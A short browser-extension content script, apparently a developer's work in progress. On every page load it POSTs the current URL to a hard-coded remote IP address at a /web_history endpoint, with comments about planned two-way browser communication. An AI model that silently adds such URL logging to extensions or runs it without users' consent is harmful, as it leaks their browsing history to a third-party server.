// content.js

window.onload = function () {
  //alert('sending data!');
  var currentUrl = window.location.href;
  json = JSON.stringify({
    url: currentUrl,
  });
  var xhr = new XMLHttpRequest();

  xhr.open("POST", "https://134.68.176.201:9000/web_history", true);
  xhr.send(json);
};

// When I get bi-directional communication with the browser
//  xhr.open('POST', 'https://localhost/process_post?myQuery=' + location , true);

// We can start to implement this sort of code above, where I can send a query to the browser.

function url() {
  if (window.location.href == "data:text/html,chromewebdata") {
    return document.title.match(/([^ ]*)/).pop();
  } else {
    return document.location.href;
  }
}
